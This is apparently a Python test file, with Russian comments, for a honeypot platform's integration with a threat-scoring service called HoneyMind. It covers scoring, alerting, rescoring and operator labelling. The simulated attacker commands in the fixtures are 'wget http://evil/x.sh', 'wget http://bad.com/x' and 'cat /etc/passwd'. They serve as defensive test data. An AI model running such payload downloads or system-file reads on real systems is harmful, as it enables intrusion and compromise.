"""Интеграция с HoneyMind: оценка событий/сессий не должна ронять приём от агента, а при
threat_score >= 60 должен уйти алерт через существующий канал центр -> оркестратор -> Telegram."""
import json
import uuid

import httpx
import pytest
from sqlalchemy import select

from app import scoring as center_scoring
from app.honeymind import HoneyMind
from app.models import Event, EventLabel, SessionAssessment
from app.orchestrator import Orchestrator
from app.scoring import rescore_events_cli, rescore_unscored_events

from .conftest import fresh
from .test_center import admin, agent_headers, event, mk_trap  # noqa: F401 (фикстуры/помощники)


class _ImmediateExecutor:
    """Подмена ThreadPoolExecutor в тестах: выполняет задачу синхронно, в вызывающем потоке —
    по тестам не нужно гадать, когда фоновая оценка завершится."""

    def submit(self, fn, *args, **kwargs):
        fn(*args, **kwargs)

        class _DoneFuture:
            def result(self):
                return None

        return _DoneFuture()


@pytest.fixture(autouse=True)
def immediate_scoring(monkeypatch):
    monkeypatch.setattr(center_scoring, "_executor", _ImmediateExecutor())


@pytest.fixture
def honeymind_up(app):
    """HoneyMind, отвечающий заранее заданным вердиктом (без реальной сети)."""
    calls = []
    verdict = {"threat_score": 12, "category": "benign", "is_human": None, "needs_review": False,
               "summary": "Безобидная навигация."}

    def handler(request: httpx.Request):
        calls.append((request.url.path, json.loads(request.content or b"null")))
        if request.url.path == "/session":
            return httpx.Response(200, json={"is_human": True, "human_probability": 0.9,
                                              "human_method": "model", "human_reason": "паузы как у человека",
                                              "script_seen_before": 0, "threat_score": 95,
                                              "download_then_execute": True, "ssh_client": "SSH-2.0-OpenSSH_9.6"})
        if request.url.path == "/predict/batch":
            data = json.loads(request.content or b"{}")
            events = data.get("events", [])
            return httpx.Response(200, json={"results": [{**verdict, "model_version": "honeymind-3"} for _ in events]})
        if request.url.path == "/health":
            return httpx.Response(200, json={"version": "honeymind-3", "status": "ok"})
        return httpx.Response(200, json=verdict)

    settings = app.state.settings.model_copy(update={"honeymind_url": "http://honeymind.internal", "honeymind_token": "t"})
    hm = HoneyMind(settings, transport=httpx.MockTransport(handler))
    app.state.honeymind = hm
    hm.calls = calls
    hm.verdict = verdict
    return hm


@pytest.fixture
def honeymind_down(app, monkeypatch):
    """HoneyMind настроен, но недоступен (timeout/connect error) — и так остаётся после всех retry."""
    def handler(request: httpx.Request):
        raise httpx.ConnectError("boom", request=request)

    settings = app.state.settings.model_copy(update={"honeymind_url": "http://honeymind.internal", "honeymind_token": "t"})
    app.state.honeymind = HoneyMind(settings, transport=httpx.MockTransport(handler))
    monkeypatch.setattr(center_scoring.time, "sleep", lambda _s: None)  # без реальных retry-пауз в тесте
    return app.state.honeymind


@pytest.fixture
def orchestrator_notify(app):
    """Подмена оркестратора: только фиксирует вызовы /api/v1/notify (алерты HoneyMind)."""
    calls = []

    def handler(request: httpx.Request):
        calls.append((request.url.path, json.loads(request.content or b"null")))
        return httpx.Response(200, json={"status": "sent"})

    settings = app.state.settings.model_copy(update={"orchestrator_url": "http://orch:4000", "orchestrator_token": "s3"})
    app.state.orchestrator = Orchestrator(settings, transport=httpx.MockTransport(handler))
    return calls


# --- ingest_events с недоступным HoneyMind: приём не падает, оценка остаётся NULL ---

def test_event_stored_unscored_when_honeymind_down(app, admin, honeymind_down):
    t = mk_trap(admin, name="ssh-bait")
    r = admin.post("/assets/v1/log", json={"events": [event(type="command", command="ls -la")]},
                  headers=agent_headers(t["token"]))
    assert r.status_code == 200 and r.json() == {"ok": 1, "dup": 0}  # приём не падает

    with app.state.session_factory() as db:
        ev = db.scalar(select(Event).where(Event.trap_id == t["id"]))
        assert ev.threat_score is None and ev.category is None and ev.needs_review is None


def test_event_stored_unscored_when_honeymind_not_configured(admin, app):
    """HF_HONEYMIND_URL не задан (по умолчанию) — тоже не должно ничего ронять."""
    assert app.state.honeymind.url == ""
    t = mk_trap(admin, name="ssh-bait")
    r = admin.post("/assets/v1/log", json={"events": [event(type="command", command="ls -la")]},
                  headers=agent_headers(t["token"]))
    assert r.status_code == 200 and r.json() == {"ok": 1, "dup": 0}


def test_log_ingest_survives_honeymind_down_alongside_other_events(app, admin, honeymind_down):
    """Бруфорс-алерт и обычные события продолжают сохраняться, даже если HoneyMind всё время недоступен."""
    t = mk_trap(admin, name="ssh-bait")
    evs = [event(type="auth_attempt", username="root", password=str(i)) for i in range(5)]
    r = admin.post("/assets/v1/log", json={"events": evs}, headers=agent_headers(t["token"]))
    assert r.status_code == 200 and r.json()["ok"] == 5
    with app.state.session_factory() as db:
        assert db.scalar(select(Event).where(Event.type == "alert")) is not None  # бруфорс центра не пострадал


# --- оценка сохраняется, алерт уходит при threat_score >= 60 ---

def test_event_scored_and_fields_exposed_in_api(app, admin, honeymind_up):
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="command", command="ls -la")]},
              headers=agent_headers(t["token"]))
    items = admin.get("/api/events").json()["items"]
    assert items[0]["threat_score"] == 12 and items[0]["category"] == "benign" and items[0]["needs_review"] is False


def test_high_threat_score_triggers_telegram_alert(app, admin, honeymind_up, orchestrator_notify):
    honeymind_up.verdict["threat_score"] = 95
    honeymind_up.verdict["category"] = "malware_downloader"
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="command", command="wget http://evil/x.sh")]},
              headers=agent_headers(t["token"]))
    notified = [c for c in orchestrator_notify if c[0].startswith("/api/v1/notify")]
    assert len(notified) == 1
    assert notified[0][1]["properties"]["threat_score"] == 95
    assert notified[0][1]["properties"]["category"] == "malware_downloader"


def test_auth_attempt_does_not_duplicate_bruteforce_alert(app, admin, honeymind_up, orchestrator_notify):
    """Для auth_attempt уже есть алерт center (перебор паролей) — HoneyMind не должен слать второй,
    даже если сам оценил событие как опасное."""
    honeymind_up.verdict["threat_score"] = 80
    honeymind_up.verdict["category"] = "credential_attempt"
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="auth_attempt", username="root", password="123456")]},
              headers=agent_headers(t["token"]))
    assert orchestrator_notify == []  # ни алерта о бруфорсе (один неудачный вход), ни алерта HoneyMind


def test_session_end_triggers_is_human_assessment(app, admin, honeymind_up, orchestrator_notify):
    t = mk_trap(admin, name="ssh-bait")
    sid = uuid.uuid4().hex
    evs = [event(type="command", command="ls", session_id=sid),
           event(type="command", command="cd /tmp", session_id=sid),
           event(type="session_end", session_id=sid)]
    admin.post("/assets/v1/log", json={"events": evs}, headers=agent_headers(t["token"]))

    sess_res = admin.get(f"/api/sessions/{sid}").json()
    assert sess_res["is_human"] is True
    assert sess_res["threat_score"] == 95
    assert sess_res["download_then_execute"] is True
    assert sess_res["ssh_client"] == "SSH-2.0-OpenSSH_9.6"
    with app.state.session_factory() as db:
        a = db.get(SessionAssessment, sid)
        assert a.human_method == "model" and a.script_seen_before == 0
        assert a.threat_score == 95 and a.download_then_execute is True
        assert a.ssh_client == "SSH-2.0-OpenSSH_9.6"
    assert any(body.get("event_name") == "honeymind_threat" for _, body in orchestrator_notify)


def test_session_not_assessed_returns_404(admin):
    assert admin.get("/api/sessions/unknown-session").status_code == 404


def test_rescore_unscored_events_batch(app, admin, honeymind_up):
    t = mk_trap(admin, name="ssh-bait")
    ev1 = event(type="command", command="whoami")
    ev2 = event(type="command", command="id")
    ev3 = event(type="command", command="uname -a")
    admin.post("/assets/v1/log", json={"events": [ev1, ev2, ev3]}, headers=agent_headers(t["token"]))

    # Имитируем, что события временно остались без оценки
    with app.state.session_factory() as db:
        events = db.scalars(select(Event).where(Event.command.is_not(None))).all()
        assert len(events) >= 3
        for e in events:
            e.threat_score = None
            e.category = None
            e.honeymind_result = None
        db.commit()

    scored = rescore_unscored_events(app.state.session_factory, honeymind_up, limit=200)
    assert scored >= 3

    with app.state.session_factory() as db:
        events = db.scalars(select(Event).where(Event.command.is_not(None))).all()
        for e in events:
            assert e.threat_score is not None
            assert e.category == "benign"
            assert e.honeymind_result is not None


def test_rescore_cli_command(app, admin, honeymind_up):
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="command", command="cat /etc/passwd")]}, headers=agent_headers(t["token"]))

    # Помечаем событие старой версией модели
    with app.state.session_factory() as db:
        ev = db.scalar(select(Event).where(Event.command == "cat /etc/passwd"))
        ev.honeymind_result = {"model_version": "honeymind-1", "threat_score": 10}
        db.commit()

    count = rescore_events_cli(app.state.session_factory, honeymind_up, target_version="honeymind-3", batch_size=200)
    assert count >= 1

    with app.state.session_factory() as db:
        ev = db.scalar(select(Event).where(Event.command == "cat /etc/passwd"))
        assert ev.honeymind_result.get("model_version") == "honeymind-3"


def test_operator_label_feedback_and_export_cli(app, admin, client):
    t = mk_trap(admin, name="ssh-bait")
    admin.post("/assets/v1/log", json={"events": [event(type="command", command="wget http://bad.com/x")]}, headers=agent_headers(t["token"]))

    with app.state.session_factory() as db:
        ev = db.scalar(select(Event).where(Event.command == "wget http://bad.com/x"))
        event_id = ev.id

    # Неавторизованный запрос на сохранение метки -> 401
    assert client.post(f"/api/events/{event_id}/label", json={"label": "malware_downloader"}).status_code == 401

    # Авторизованный оператор/админ -> 200
    r = admin.post(f"/api/events/{event_id}/label", json={"label": "malware_downloader"}, headers=admin.h)
    assert r.status_code == 200
    assert r.json()["label"] == "malware_downloader"

    with app.state.session_factory() as db:
        lbl = db.scalar(select(EventLabel).where(EventLabel.event_id == event_id))
        assert lbl is not None
        assert lbl.label == "malware_downloader"
        assert lbl.operator == "admin"
